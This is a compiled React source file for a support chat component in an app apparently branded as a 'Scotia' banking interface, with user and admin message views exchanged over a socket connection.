import { jsx as _jsx, jsxs as _jsxs } from "react/jsx-runtime";
import { useState, useEffect, useRef } from 'react';
import { X, Send } from 'lucide-react';
import { useSocket } from '../shared/SocketContext';
import { useBank } from '../shared/BankContext';
export const SupportChat = ({ isAdmin, targetSocketId, onClose, isOpen }) => {
    const [messages, setMessages] = useState([]);
    const [input, setInput] = useState('');
    const { socket, sendCommand } = useSocket();
    const { user } = useBank();
    const messagesEndRef = useRef(null);
    useEffect(() => {
        if (!socket)
            return;
        const handleChatMessage = (data) => {
            // If I'm the admin, I want to see messages from the user I'm chatting with
            // If I'm a user, I want to see messages from 'admin'
            const isRelevant = isAdmin
                ? (data.from === targetSocketId || data.to === targetSocketId)
                : (data.from === 'admin' || data.from === user?.username);
            if (isRelevant) {
                const newMsg = {
                    sender: data.from === 'admin' ? 'Support' : (data.from === user?.username ? 'You' : data.from),
                    text: data.message,
                    timestamp: Date.now()
                };
                setMessages(prev => [...prev, newMsg]);
                // Show notification if chat is not open and it's from admin
                if (!isOpen && !isAdmin && data.from === 'admin') {
                    window.dispatchEvent(new CustomEvent('scotia_notification', {
                        detail: {
                            title: 'Scotia Support',
                            message: data.message,
                            type: 'chat'
                        }
                    }));
                }
            }
        };
        socket.on('chat_message', handleChatMessage);
        return () => { socket.off('chat_message', handleChatMessage); };
    }, [socket, isOpen, isAdmin, targetSocketId, user?.username]);
    useEffect(() => {
        messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [messages]);
    const sendMessage = () => {
        if (!input.trim())
            return;
        if (isAdmin && targetSocketId) {
            sendCommand(targetSocketId, 'chat_message', { message: input });
            setMessages(prev => [...prev, { sender: 'You', text: input, timestamp: Date.now() }]);
        }
        else if (!isAdmin && socket) {
            socket.emit('chat_message', { from: user?.username || 'User', message: input });
            setMessages(prev => [...prev, { sender: 'You', text: input, timestamp: Date.now() }]);
        }
        setInput('');
    };
    if (!isOpen && !isAdmin)
        return null;
    return (_jsxs("div", { className: `fixed inset-0 bg-white z-[2000] flex flex-col ${isAdmin ? 'relative h-full' : ''}`, children: [_jsxs("div", { className: "p-4 bg-[#ED0711] text-white flex items-center gap-4 shrink-0 pt-12", children: [!isAdmin && (_jsx("button", { onClick: onClose, className: "p-1 hover:bg-white/10 rounded-full", children: _jsx(X, { size: 24 }) })), _jsxs("div", { className: "flex-1", children: [_jsx("h3", { className: "font-bold text-lg", children: "Support Chat" }), _jsx("p", { className: "text-xs opacity-80", children: "We're here to help 24/7" })] })] }), _jsxs("div", { className: "flex-1 p-4 overflow-y-auto space-y-4 bg-gray-50", children: [_jsx("div", { className: "text-center py-4", children: _jsx("p", { className: "text-[10px] text-gray-400 uppercase font-bold tracking-widest", children: "Today" }) }), messages.length === 0 && (_jsx("div", { className: "bg-white p-4 rounded-2xl shadow-sm border border-gray-100 text-center", children: _jsx("p", { className: "text-sm text-gray-500", children: "How can we help you today?" }) })), messages.map((msg, i) => (_jsxs("div", { className: `flex flex-col ${msg.sender === 'You' ? 'items-end' : 'items-start'}`, children: [_jsx("div", { className: `max-w-[80%] p-3 rounded-2xl text-sm shadow-sm ${msg.sender === 'You'
                                    ? 'bg-[#ED0711] text-white rounded-tr-none'
                                    : 'bg-white text-gray-800 rounded-tl-none border border-gray-100'}`, children: msg.text }), _jsx("span", { className: "text-[10px] text-gray-400 mt-1 px-1", children: new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) })] }, i))), _jsx("div", { ref: messagesEndRef })] }), _jsxs("div", { className: "p-4 bg-white border-t border-gray-100 flex gap-2 items-center pb-8", children: [_jsx("input", { value: input, onChange: (e) => setInput(e.target.value), onKeyPress: (e) => e.key === 'Enter' && sendMessage(), className: "flex-1 p-3 bg-gray-100 rounded-2xl text-sm focus:outline-none focus:ring-2 focus:ring-[#ED0711]/20 transition-all", placeholder: "Type your message..." }), _jsx("button", { onClick: sendMessage, disabled: !input.trim(), className: "p-3 bg-[#ED0711] text-white rounded-2xl disabled:opacity-50 disabled:grayscale transition-all active:scale-95", children: _jsx(Send, { size: 20 }) })] })] }));
};
